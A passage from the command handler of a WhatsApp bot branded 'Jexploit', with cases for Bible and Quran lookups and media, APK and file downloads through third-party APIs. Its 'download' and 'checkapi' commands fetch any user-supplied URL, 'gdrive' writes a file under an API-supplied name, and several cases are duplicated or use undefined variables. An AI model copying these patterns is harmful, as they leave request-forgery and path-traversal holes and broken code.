    }
}
break
case "biblelist": {
try {
        // Liste des livres de la Bible
        const bibleList = `
📜 *Old Testament*:
1. Genesis
2. Exodus
3. Leviticus
4. Numbers
5. Deuteronomy
6. Joshua
7. Judges
8. Ruth
9. 1 Samuel
10. 2 Samuel
11. 1 Kings
12. 2 Kings
13. 1 Chronicles
14. 2 Chronicles
15. Ezra
16. Nehemiah
17. Esther
18. Job
19. Psalms
20. Proverbs
21. Ecclesiastes
22. Song of Solomon
23. Isaiah
24. Jeremiah
25. Lamentations
26. Ezekiel
27. Daniel
28. Hosea
29. Joel
30. Amos
31. Obadiah
32. Jonah
33. Micah
34. Nahum
35. Habakkuk
36. Zephaniah
37. Haggai
38. Zechariah
39. Malachi

📖 *New Testament*:
1. Matthew
2. Mark
3. Luke
4. John
5. Acts
6. Romans
7. 1 Corinthians
8. 2 Corinthians
9. Galatians
10. Ephesians
11. Philippians
12. Colossians
13. 1 Thessalonians
14. 2 Thessalonians
15. 1 Timothy
16. 2 Timothy
17. Titus
18. Philemon
19. Hebrews
20. James
21. 1 Peter
22. 2 Peter
23. 1 John
24. 2 John
25. 3 John
26. Jude
27. Revelation


💢 ${global.botname} 💢
`;

        // Remplacer ce lien par l'URL de l'image que tu m'enverras
        const imageUrl = "https://files.catbox.moe/ptpl5c.jpeg"; // Remplace "TON_LIEN_IMAGE_ICI" par ton lien d'image

        // Vérifier si le message de la commande est correctement reçu
        if (!m.chat) {
            return reply("❌ *An error occurred: Invalid chat.*");
        }

        // Envoi de la réponse avec l'image et la liste des livres de la Bible
        await conn.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: `📖 *BIBLE LIST Jexploit*:\n\n` +
                     `Here is the complete list of books in the Bible:\n\n` +
                     bibleList.trim() // Ajout du texte des livres de la Bible
        }, { quoted: mek });
    } catch (error) {
        console.error(error);
        reply(mess.error);
    }
}
break
case "Quran": {
try {
        if (!surahNumber || isNaN(surahNumber)) {
            await conn.sendMessage(chatId, { text: "📖 Usage: .quran <surah_number>\nExample: .quran 1" });
            return;
        }

        const url = `https://apis.davidcyriltech.my.id/quran?surah=${surahNumber}`;
        const res = await axios.get(url);

        if (!res.data.success) {
            await conn.sendMessage(chatId, { text: "❌ Could not fetch Surah. Please try another number." });
            return;
        }

        const { number, name, type, ayahCount, tafsir, recitation } = res.data.surah;

        // 1️⃣ Send surah info as text
        let reply = `📖 *Surah ${name.english}* (${name.arabic})\n\n`;
        reply += `Surah Number: ${number}\n📌 Type: ${type}\n📜 Ayahs: ${ayahCount}\n\n`;
        reply += `Tafsir: ${tafsir.id}`;

        await conn.sendMessage(chatId, { text: reply });

        // 2️⃣ Send audio as PTT (voice note)
        await conn.sendMessage(chatId, {
            audio: { url: recitation },
            mimetype: "audio/mp4",
            ptt: true
        }, { quoted: message });

    } catch (err) {
        await conn.sendMessage(chatId, { text: "⚠️ Error fetching Surah. Try again later." });
        console.error("Quran command error:", err.message);
    }
}
break
case 'song':
case 'xplay': {
    if (!text) return reply(`*Example*: ${prefix + command} sekkle down by bunnie Gunter`);

    try {
        await reply("Searching for your song... (this may take a while)");

        // Search on YouTube
        const searchResult = await yts(text);
        if (!searchResult || !searchResult.videos || searchResult.videos.length === 0) {
            return reply("Couldn't find that song on YouTube.");
        }
        
        const video = searchResult.videos[0];
        const videoUrl = video.url; 
        let uploadYear = "N/A";
        const agoMatch = video.ago?.match(/\d{4}/);
        if (agoMatch) {
            uploadYear = agoMatch[0];
        } else {
            uploadYear = new Date().getFullYear();
        }

        const searchInfo = 
            `*SEARCH RESULTS*\n\n` +
            `*Title:* ${video.title}\n` +
            `*Artist/Channel:* ${video.author.name}\n` +
            `*Duration:* ${video.timestamp}\n` +
            `*Uploaded:* ${video.ago} (${uploadYear})\n` +
            `*Views:* ${video.views.toLocaleString()}\n\n` +
            `⬇️ *Downloading audio...*`;
        
        // Send search info and save the message
        const searchMessage = await conn.sendMessage(
            m.chat,
            {
                text: searchInfo
            },
            { quoted: m }
        );
        
        const apiUrl = `https://yt-dl.officialhectormanuel.workers.dev/?url=${encodeURIComponent(videoUrl)}`;
        const response = await axios.get(apiUrl, { timeout: 30000 });
        const data = response.data;

        if (!data?.status) {
            return reply("Couldn't download the audio from this API.");
        }

        const audioUrl = data.audio;
        if (!audioUrl) {
            return reply("No audio URL found in API response.");
        }

        const title = video.title || text;
        
        await conn.sendMessage(
            m.chat,
            {
                audio: { url: audioUrl },
                mimetype: "audio/mpeg",
                fileName: `${title}.mp3`,
            },
            { quoted: searchMessage } 
        );
    } catch (err) {
        console.error("song command error:", err.message);
        reply(mess.error);
    }
}
break
case 'play': {
    await playCommand(conn, m.chat, m, args);
    
}
break
case "ringtone": {
try {
        const query = args.join(" ");
        if (!query) {
            return reply("Please provide a search query! Example: .ringtone Suna");
        }

        const { data } = await axios.get(`https://www.dark-yasiya-api.site/download/ringtone?text=${encodeURIComponent(query)}`);

        if (!data.status || !data.result || data.result.length === 0) {
            return reply("No ringtones found for your query. Please try a different keyword.");
        }

        const randomRingtone = data.result[Math.floor(Math.random() * data.result.length)];

        await conn.sendMessage(
            from,
            {
                audio: { url: randomRingtone.dl_link },
                mimetype: "audio/mpeg",
                fileName: `${randomRingtone.title}.mp3`,
            },
            { quoted: m }
        );
    } catch (error) {
        console.error("Error in ringtone command:", error);
        reply(mess.error);
    }
}
break
case "playdoc": {
if (!text) return reply('*Please provide a song name!*');

    try {
      const search = await yts(text);
      if (!search || search.all.length === 0) return reply('*The song you are looking for was not found.*');

      const video = search.all[0];
      const downloadUrl = await fetchMp3DownloadUrl(video.url);

      await conn.sendMessage(m.chat, {
        document: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${video.title}.mp3`
      }, { quoted: m });

    } catch (error) {
      console.error('playdoc command failed:', error);
      reply(mess.error);
    }
}
break;
case "play2": {
    if (!text) return reply("*Please provide a song name!*\nExample: `.play2 despacito`");

    try {
        const searchQuery = text.trim();
        
        if (!searchQuery) {
            return reply("*Please provide a song name!*\nExample: `.play2 despacito`");
        }

        // Search YouTube
        const { videos } = await yts(searchQuery);
        if (!videos || videos.length === 0) {
            return reply("⚠️ *No results found for your query!*");
        }

        // Use first video
        const video = videos[0];
        const videoUrl = video.url;

        // Send video info before download
        await reply("⏳ *Searching and downloading audio... Please wait*");
        
        await conn.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: `*${video.title}*\n⏱ *Duration:* ${video.timestamp}\n *Views:* ${video.views.toLocaleString()}\n\n⏳ *Downloading audio...*`
        }, { quoted: m });

        // Call the API with ?url= style
        const apiUrl = `https://yt-dl.officialhectormanuel.workers.dev/?url=${encodeURIComponent(videoUrl)}`;
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (!data?.status) {
            return reply("🚫 *Failed to fetch audio from API. Try again later.*");
        }

        // The API returns fields: title, thumbnail, audio, videos, etc.
        const audioUrl = data.audio;
        const title = data.title || video.title;

        if (!audioUrl) {
            return reply("🚫 *No audio URL found in the response.*");
        }

        // Send the audio file
        await conn.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: "audio/mpeg",
            fileName: `${title.replace(/[^\w\s]/gi, '')}.mp3`,
            ptt: false
        }, { quoted: m });

    } catch (error) {
        console.error('Error in play2 command:', error);
        reply(mess.error);
    }
    
}
break
case "audio":
case "music": {
    if (!text) return reply(global.mess.notext);

    try {
        const searchQuery = text.split(' ').slice(1).join(' ').trim();
        
        if (!searchQuery) {
            await conn.sendMessage(m.chat, { 
                text: "Please provide a song name!\nExample: `.song Lilly Alan Walker`"
            }, { quoted: m });

            // React ❌ when no query
            await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key }});
            return;
        }

        // React 🔎 while searching
        await conn.sendMessage(m.chat, { react: { text: "🔎", key: m.key }});

        // Search YouTube
        const { videos } = await yts(searchQuery);
        if (!videos || videos.length === 0) {
            await conn.sendMessage(m.chat, { 
                text: "⚠️ No results found for your query!"
            }, { quoted: m });

            // React ⚠️ when no results
            await conn.sendMessage(m.chat, { react: { text: "⚠️", key: m.key }});
            return;
        }

        // Use first video
        const video = videos[0];
        const videoUrl = video.url;

        // Send video info before download
        await conn.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: `🎵 *${video.title}*\n\n𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙𝙞𝙣𝙜... 🎶\n\n> KELVIN DEV`
        }, { quoted: m });

        // React ⏳ while downloading
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key }});

        // Call the new API with ?url= style
        const apiUrl = `https://yt-dl.officialhectormanuel.workers.dev/?url=${encodeURIComponent(videoUrl)}`;
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (!data?.status) {
            await conn.sendMessage(m.chat, {
                text: "🚫 Failed to fetch from new endpoint. Try again later."
            }, { quoted: m });

            // React 🚫 if API fails
            await conn.sendMessage(m.chat, { react: { text: "🚫", key: m.key }});
            return;
        }

        const audioUrl = data.audio;
        const title = data.title || video.title;

        if (!audioUrl) {
            await conn.sendMessage(m.chat, {
                text: "🚫 No audio URL in the response. Can't send audio."
            }, { quoted: m });

            // React ❌ if audio not found
            await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key }});
            return;
        }

        // Send the audio file
        await conn.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: "audio/mpeg",
            fileName: `${title}.mp3`
        }, { quoted: m });

        // React ✅ on success
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key }});

    } catch (error) {
        console.error('Error in songCommand:', error);
        await conn.sendMessage(m.chat, {
            text: `${mess.error}`
        }, { quoted: m });

        // React ❌ on error
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key }});
    }
    
}
break 
case "spotify": {
    if (!text) return reply("Example: spotify runtuh");

    reply("Searching for the song on Spotify...");

    try {
        // Step 1: Search song on Spotify
        const searchRes = await axios.get(`https://apidl.vercel.app/api/spotifysearch?q=${encodeURIComponent(text)}`);
        const searchData = searchRes.data;

        if (!searchData.status || searchData.result.length === 0) {
            return reply("🚫 Song not found on Spotify.");
        }

        const firstResult = searchData.result[0];
        const songLink = firstResult.link;

        // Step 2: Download song from Spotify
        reply(`🎧 Downloading audio from: ${firstResult.title} (${firstResult.artists})`);
        const downloadRes = await axios.get(`https://apidl.vercel.app/api/spotifydl?url=${encodeURIComponent(songLink)}`);
        const downloadData = downloadRes.data;

        if (!downloadData.status) {
            return reply("🚫 Failed to download audio from Spotify.");
        }

        const audioUrl = downloadData.result.download;
        const audioTitle = downloadData.result.title;
        const artists = downloadData.result.artist;

        // Step 3: Download the audio file
        const audioPath = path.resolve(__dirname, `../temp/${audioTitle.replace(/[^a-zA-Z0-9]/g, "_")}.mp3`);
        const audioFile = await axios.get(audioUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(audioPath, audioFile.data);

        // Step 4: Send audio to user - FIXED: using m.chat and proper Baileys syntax
        await client.sendMessage(m.chat, {
            audio: fs.readFileSync(audioPath),
            mimetype: 'audio/mpeg',
            fileName: `${audioTitle}.mp3`,
            caption: `🎵 Song: *${audioTitle}*\n👤 Artist: *${artists}*`
        }, { quoted: m });

        // Clean up
        fs.unlinkSync(audioPath);
    } catch (error) {
        console.error(error);
        reply(mess.error);
    }
    
}
break
case 'instagram': {
       await InstagramCommand(conn, m.chat, m);
}
break
case 'ytmp4': {
if (!text) return reply('.ytmp4 <YouTube URL>');
        
        try {
            await reply('⏳ Downloading video...');
            
            const apiUrl = `https://apiskeith.top/download/mp4?url=${encodeURIComponent(text)}`;
            const res = await axios.get(apiUrl);
            const data = res.data;
            
            if (data.status && data.result) {
                await conn.sendMessage(m.chat, {
                    video: { url: data.result },
                    caption: `📹 *YouTube Video*\n\n${global.wm || ''}`
                }, { quoted: m });
            } else {
                reply('Failed to download video');
            }
            
        } catch (error) {
            console.error('ytmp4 error:', error);
            reply('Error: ' + error.message);
        }
}
break
case 'video': {
    try {
        if (!text) return reply("Provide a YouTube video name or link.");

        let videoUrl = "";
        let videoTitle = "";
        let videoThumbnail = "";

        // Detect or Search
        if (/^https?:\/\//.test(text)) {
            videoUrl = text;
        } else {
            const s = await yts(text);
            if (!s?.videos?.length) return reply("❌ No results found.");
            const v = s.videos[0];
            videoUrl = v.url;
            videoTitle = v.title;
            videoThumbnail = v.thumbnail;
        }

        // Extract ID
        const videoId =
            (videoUrl.match(/(?:v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/) || [])[1];

        // Show preview fast
        if (videoThumbnail || videoId) {
            const thumb =
                videoThumbnail ||
                `https://i.ytimg.com/vi/${videoId}/sddefault.jpg`;

            await conn.sendMessage(
                m.chat,
                {
                    image: { url: thumb },
                    caption: `🎬 *${videoTitle || text}*\n⌛ Fetching downloaded video...`,
                },
                { quoted: m }
            );
        }

        // Use yt-dl to get video title
        if (!videoTitle && videoUrl) {
            try {
                const ytdl = require('ytdl-core');
                const info = await ytdl.getInfo(videoUrl);
                videoTitle = info.videoDetails.title;
            } catch (e) {
                console.log("yt-dl title fetch error:", e);
            }
        }

        // Use only the last API
        const API_URL = `https://media.cypherxbot.space/download/youtube/video?url=${encodeURIComponent(videoUrl)}`;
        
        let result = null;

        // Fetch from the single API
        try {
            const response = await axios.get(API_URL, { timeout: 30000 });
            const data = response.data;

            // Normalize download URL detection
            const dl =
                data?.result?.download_url ||
                data?.result?.mp4 ||
                data?.result?.url ||
                data?.download_url ||
                data?.url ||
                data?.videoUrl;

            if (dl) {
                result = {
                    url: dl,
                    title: videoTitle || data?.result?.title || "Downloaded Video",
                };
            }
        } catch (error) {
            console.log("API Error:", error);
        }

        if (!result) return reply("❌ Failed to download video from server.");

        // SEND THE VIDEO
        await conn.sendMessage(
            m.chat,
            {
                video: { url: result.url },
                mimetype: "video/mp4",
                fileName: `${result.title.replace(/[^\w\s]/gi, '')}.mp4`,
                caption: `🎥 *${result.title}*\n\n> ${global.wm} ™`
            },
            { quoted: m }
        );
    } catch (e) {
        console.log("VIDEO ERROR:", e);
        reply(mess.error);
    }
}
break;
case 'checkapi': {
    if (!text) return reply(`Usage: ${prefix}checkapi <url>`);
    
    try {
        await conn.sendMessage(m.chat, { react: { text: "🔍", key: m.key } });
        
        let apiUrl = text.trim();
        if (!apiUrl.startsWith('http')) {
            apiUrl = 'https://' + apiUrl;
        }
        
        const startTime = Date.now();
        const response = await fetch(apiUrl);
        const responseTime = Date.now() - startTime;
        
        const apiData = await response.json();
        
        // Simple status check
        const statusEmoji = response.status === 200 && apiData.success ? '🟢' : '🔴';
        const statusText = response.status === 200 && apiData.success ? 'ONLINE' : 'ISSUES';
        
        const statusMessage = `
${statusEmoji} *API STATUS CHECK*

📡 *URL:* ${apiUrl}
⏱️ *Response Time:* ${responseTime}ms
🔢 *HTTP Status:* ${response.status}
✅ *API Success:* ${apiData.success ? 'Yes' : 'No'}
👤 *Creator:* ${apiData.creator || 'N/A'}

${statusEmoji} *OVERALL STATUS:* ${statusText}
        `.trim();
        
        await reply(statusMessage);
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        
    } catch (error) {
        console.error('CheckAPI Error:', error);
        
        const errorMessage = `
🔴 *API CHECK FAILED*

📡 *URL:* ${text}
💥 *Error:* ${error.message}

❌ *STATUS:* OFFLINE OR INACCESSIBLE
        `.trim();
        
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply(errorMessage);
    }
    
}
break
case "ytstalk": {
try {
    if (!q) {
      return reply("❌ Please provide a valid YouTube channel username or ID.");
    }

    await conn.sendMessage(from, {
      react: { text: "⏳", key: m.key }
    });

    const apiUrl = `https://delirius-apiofc.vercel.app/tools/ytstalk?channel=${encodeURIComponent(q)}`;
    const { data } = await axios.get(apiUrl);

    if (!data || !data.status || !data.data) {
      return reply("⚠️ Failed to fetch YouTube channel details. Ensure the username or ID is correct.");
    }

    const yt = data.data;
    const caption = `╭━━━〔 *YOUTUBE STALKER* 〕━━━⊷\n`
      + `┃👤 *Username:* ${yt.username}\n`
      + `┃📊 *Subscribers:* ${yt.subscriber_count}\n`
      + `┃🎥 *Videos:* ${yt.video_count}\n`
      + `┃🔗 *Channel Link:* (${yt.channel})\n`
      + `╰━━━⪼\n\n`
      + `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Jexploit`;

    await conn.sendMessage(from, {
      image: { url: yt.avatar },
      caption: caption
    }, { quoted: m });

  } catch (error) {
    console.error("Error:", error);
    reply(mess.error);
  }
}
break
case "download": {
if (!text) return reply('Enter download URL');
    
    try {
      let res = await fetch(text, { method: 'GET', redirect: 'follow' });
      let contentType = res.headers.get('content-type');
      let buffer = await res.buffer();
      let extension = contentType.split('/')[1]; 
      let filename = res.headers.get('content-disposition')?.match(/filename="(.*)"/)?.[1] || `download-${Math.random().toString(36).slice(2, 10)}.${extension}`;

      let mimeType;
      switch (contentType) {
        case 'audio/mpeg':
          mimeType = 'audio/mpeg';
          break;
        case 'image/png':
          mimeType = 'image/png';
          break;
        case 'image/jpeg':
          mimeType = 'image/jpeg';
          break;
        case 'application/pdf':
          mimeType = 'application/pdf';
          break;
        case 'application/zip':
          mimeType = 'application/zip';
          break;
        case 'video/mp4':
          mimeType = 'video/mp4';
          break;
        case 'video/webm':
          mimeType = 'video/webm';
          break;
        case 'application/vnd.android.package-archive':
          mimeType = 'application/vnd.android.package-archive';
          break;
        default:
          mimeType = 'application/octet-stream';
      }

      conn.sendMessage(m.chat, { document: buffer, mimetype: mimeType, fileName: filename }, { quoted: m });
    } catch (error) {
      reply(`Error downloading file: ${error.message}`);
    }
}
break
case "apk": {
if (!text) return reply("*Which apk do you want to download?*");
    
    try {
      let apiUrl = await fetchJson(`https://api.bk9.dev/search/apk?q=${text}`);
      let kelvin = await fetchJson(`https://api.bk9.dev/download/apk?id=${apiUrl.BK9[0].id}`);

      await conn.sendMessage(
        m.chat,
        {
          document: { url: kelvin.BK9.dllink },
          fileName: kelvin.BK9.name,
          mimetype: "application/vnd.android.package-archive",
          contextInfo: {
            externalAdReply: {
              title: botname,
              body: `${kelvin.BK9.name}`,
              thumbnailUrl: `${kelvin.BK9.icon}`,
              sourceUrl: `${kelvin.BK9.dllink}`,
              mediaType: 2,
              showAdAttribution: true,
              renderLargerThumbnail: true
            }
          }
        },
        { quoted: m }
      );
    } catch (error) {
      reply(mess.error);
    }
}
break
case "gdrive": {
if (!text) return reply("*Please provide a Google Drive file URL*");

    try {
      let response = await fetch(`${global.siputzx}/api/d/gdrive?url=${encodeURIComponent(text)}`);
      let data = await response.json();

      if (response.status !== 200 || !data.status || !data.data) {
        return reply("*Please try again later or try another command!*");
      } else {
        const downloadUrl = data.data.download;
        const filePath = path.join(__dirname, `${data.data.name}`);

        const writer = fs.createWriteStream(filePath);
        const fileResponse = await axios({
          url: downloadUrl,
          method: 'GET',
          responseType: 'stream'
        });

        fileResponse.data.pipe(writer);

        writer.on('finish', async () => {
          await conn.sendMessage(m.chat, {
            document: { url: filePath },
            fileName: data.data.name,
            mimetype: fileResponse.headers['content-type']
          });

          fs.unlinkSync(filePath);
        });

        writer.on('error', (err) => {
          console.error('Error downloading the file:', err);
          reply("An error occurred while downloading the file.");
        });
      }
    } catch (error) {
      console.error('Error fetching Google Drive file details:', error);
      reply(mess.error);
    }
}
break
case "image":
case "img":
case "pinterest": {
if (!text) return reply("*Please provide a search query*");

    try {
      let response = await fetch(`https://api.vreden.my.id/api/pinterest?query=${encodeURIComponent(text)}`);
      let data = await response.json();

      if (response.status !== 200 || !data.result || data.result.length === 0) {
        return reply("*No images found or API error. Please try again later or try another query!*");
      } else {
        const images = data.result.slice(0, 5);

        for (const imageUrl of images) {
          await conn.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: `Search: ${text}`,
          });
          await new Promise(resolve => setTimeout(resolve, 500)); 
        }
      }
    } catch (error) {
      console.error('Error fetching images:', error);
      reply(mess.error);
    }
}
break
case 'instagram':
case 'ig': {
    if (!args[0]) return reply(`❌ Please provide Instagram URL\n\nExample: ${prefix}instagram https://www.instagram.com/reel/...`);
    
    try {
        await reply('⬇️ Downloading...');
        
        let url = args[0];
        let apiUrl = `https://api.nekolabs.web.id/downloader/instagram?url=${encodeURIComponent(url)}`;
        
        let { data } = await axios.get(apiUrl);
        
        if (!data?.data?.video?.[0]?.url) {
            throw new Error('No video found');
        }
        
        let videoUrl = data.data.video[0].url;
        let videoBuffer = await getBuffer(videoUrl);
        
        // Send video with global watermark as caption
        await conn.sendMessage(m.chat, {
            video: videoBuffer,
            caption: global.wm || '✨ Powered by Jexploit'
        }, { quoted: m });
        
    } catch (error) {
        console.error(error);
        reply(mess.error);
    }
    
}
break
case 'gitclone': {
if (!text) return reply("*Please provide gitHub repository link*")
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return reply("*Invalid link*")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await reply(`*Error! Repository Not Found*`)
}}
break
case 'mf':
case 'mediafire': {
    await handleMediafireDownload(conn, m.chat, m);
}
    break;
break
case "itunes": {
if (!text) return reply("*Please provide a song name*");
    
    try {
      let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`);
      if (!res.ok) {
        throw new Error(`*API request failed with status ${res.status}*`);
      }
      let json = await res.json();
      let songInfo = `*Song Information:*\n
 • *Name:* ${json.name}\n
 • *Artist:* ${json.artist}\n
 • *Album:* ${json.album}\n
 • *Release Date:* ${json.release_date}\n
 • *Price:* ${json.price}\n
 • *Length:* ${json.length}\n
 • *Genre:* ${json.genre}\n
 • *URL:* ${json.url}`;
     
      if (json.thumbnail) {
        await conn.sendMessage(
          m.chat,
          { image: { url: json.thumbnail }, caption: songInfo },
          { quoted: m }
        );
      } else {
        reply(songInfo);
      }
    } catch (error) {
      console.error(error);
      reply(mess.error);
    }
}
break;
case 'tiktok': {
if (!text) return reply(`Use : ${prefix + command} link`)
// wait message
reply(mess.wait)
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await conn.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
conn.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
conn.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break       
case 'fb':
case 'facebook': {
    if (!text) return reply(`Please provide a Facebook video URL\n\nExample: ${prefix}fb https://www.facebook.com/share/r/19zyz6X8KJ/`);

    const url = text.trim();
    
    // Validate URL
    if (!url.includes('facebook.com') && !url.includes('fb.watch')) {
        return reply('Please provide a valid Facebook URL');
    }

    // Send processing message
    await reply('⏳ Downloading Facebook video... Please wait...');
    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        // Fetch video from API
        const apiUrl = `https://apiskeith.top/download/fbdown?url=${encodeURIComponent(url)}`;
        const response = await axios.get(apiUrl, { timeout: 30000 });
        
        // Check response
        if (!response.data?.status) {
            throw new Error('Invalid API response');
        }

        const videoUrl = response.data.result;
        
        if (!videoUrl) {
            throw new Error('No video URL found');
        }

        // Send the video with global.wm caption
        await conn.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: global.wm || '© Jexploit Bot',
            mimetype: 'video/mp4'
        }, { quoted: m });

        // Success reaction
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Facebook download error:', error);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = '❌ Failed to download video. ';
        if (error.message.includes('timeout')) {
            errorMsg += 'Request timed out.';
        } else if (error.message.includes('No video URL')) {
            errorMsg += 'Could not retrieve video URL.';
        } else {
            errorMsg += 'Please try again later.';
        }
        reply(errorMsg);
    }
    break;
}
case 'twitter':
case 'x': {
    if (!text) return reply(`*Please provide Twitter link or url!*`);

    try {
        // React while processing
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        // API URL
        const apiUrl = `https://api.siputzx.my.id/api/d/twitter?url=${encodeURIComponent(text)}`;
        
        // Fetch response
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (data.status && data.data && data.data.downloadLink) {
            // Send video
            await conn.sendMessage(
                m.chat,
                {
                    video: { url: data.data.downloadLink },
                    mimetype: 'video/mp4',
                    caption: `*${data.data.videoTitle || 'Twitter Video'}*\n\n${global.wm || ''}`
                },
                { quoted: m }
            );
            
            // Success reaction
            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        } else {
            throw new Error('No video found');
        }
        
    } catch (error) {
        console.error('Twitter command error:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply(mess.error);
    }
}
break
case 'tiktok':
case 'tt': {
    if (!text) return reply(conn, `Use: ${prefix + command} <tiktok_link>`, m)
    
    await reply(`Please wait ${global.botname} 💪 its fetching you video...`)
    
    
    try {
        let data = await fg.tiktok(text)
        let json = data.result
        let caption = `[ TIKTOK DOWNLOAD ]\n\n`
        caption += `◦ *ID*: ${json.id}\n`
        caption += `◦ *Username*: ${json.author?.nickname || 'N/A'}\n`
        caption += `◦ *Title*: ${json.title || 'No title'}\n`
        caption += `◦ *Likes*: ${json.digg_count || 0}\n`
        caption += `◦ *Comments*: ${json.comment_count || 0}\n`
        caption += `◦ *Shares*: ${json.share_count || 0}\n`
        caption += `◦ *Plays*: ${json.play_count || 0}\n`
        caption += `◦ *Created*: ${json.create_time || 'Unknown'}\n`
        caption += `◦ *Size*: ${json.size || 'Unknown'}\n`
        caption += `◦ *Duration*: ${json.duration || 'Unknown'} seconds`
        
        if (json.images) {
            // Handle image slideshow
            for (let imageUrl of json.images) {
                await conn.sendMessage(m.chat, { 
                    image: { url: imageUrl },
                    caption: caption
                }, { quoted: m })
                await sleep(2000) // Delay between images
            }
        } else if (json.play) {
            // Handle video
            await conn.sendMessage(m.chat, { 
                video: { url: json.play }, 
                mimetype: 'video/mp4',
                caption: caption
            }, { quoted: m })
            
            // Send music separately if available
            if (json.music) {
                await sleep(3000)
                await conn.sendMessage(m.chat, { 
                    audio: { url: json.music },
                    mimetype: 'audio/mpeg'
                }, { quoted: m })
            }
        } else {
            await reply(bot, 'Failed to download TikTok content. The link might be invalid or private.', m)
        }
    } catch (error) {
        console.error('TikTok Error:', error)
        await reply(bot, 'Error downloading TikTok content. Please try again later or check the link.', m)
    }
}
break
case "tiktok2": {
if (!args[0]) return reply('*Please provide a TikTok video url!*');
    
    try {
      let apiUrl = await fetchJson(`https://api-aswin-sparky.koyeb.app/api/downloader/tiktok?url=${args[0]}`);
      
      await conn.sendMessage(
        m.chat,
        {
          caption: global.wm,
          video: { url: apiUrl.data.video },
          fileName: "video.mp4",
          mimetype: "video/mp4",
        },
        { quoted: m }
      );
    } catch (error) {
      reply(mess.error);
    }
}
break 
case 'tiktoksearch':
case 'tts': {
    const query = body.slice(command.length + 1).trim();
    if (!query) return reply("*Provide TikTok username or search query*.");
    
    await conn.sendMessage(m.chat, { 
        text: `🔍 Searching TikTok for "${query}"...` 
    }, { quoted: m });
    
    const result = await tiktokSearch(query);
    await conn.sendMessage(m.chat, { text: result }, { quoted: m });
    
}
break
case "TikTokaudio": {
if (!args[0]) return reply('*Please provide a TikTok audio url!*');
    
    try {
      let apiUrl = await fetchJson(`https://api-aswin-sparky.koyeb.app/api/downloader/tiktok?url=${args[0]}`);
      
      await conn.sendMessage(
        m.chat,
        {
          audio: { url: apiUrl.data.audio },
          fileName: "tiktok.mp3",
          mimetype: "audio/mpeg",
        },
        { quoted: m }
      );
    } catch (error) {
      reply(global.mess.error);
    }
}
break
case "savestatis":
case  "save": {
await saveStatusMessage(m);
  }
break
case "apk2": {
try {
    if (!q) {
      return reply("❌ Please provide an app name to search.");
    }

    await conn.sendMessage(from, { react: { text: "⏳", key: m.key } });

    const apiUrl = `http://ws75.aptoide.com/api/7/apps/search/query=${q}/limit=1`;
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (!data || !data.datalist || !data.datalist.list.length) {
      return reply("⚠️ No results found for the given app name.");
    }

    const app = data.datalist.list[0];
    const appSize = (app.size / 1048576).toFixed(2); // Convert bytes to MB

    const caption = `╭━━━〔 *APK Downloader* 〕━━━┈⊷
┃ 📦 *Name:* ${app.name}
┃ 🏋 *Size:* ${appSize} MB
┃ 📦 *Package:* ${app.package}
┃ 📅 *Updated On:* ${app.updated}
┃ 👨‍💻 *Developer:* ${app.developer.name}
╰━━━━━━━━━━━━━━━┈⊷
🔗 *Powered By Jexploit *`;

    await conn.sendMessage(from, { react: { text: "⬆️", key: m.key } });

    await conn.sendMessage(from, {
      document: { url: app.file.path_alt },
      fileName: `${app.name}.apk`,
      mimetype: "application/vnd.android.package-archive",
      caption: caption
    }, { quoted: m });

    await conn.sendMessage(from, { react: { text: "✅", key: m.key } });

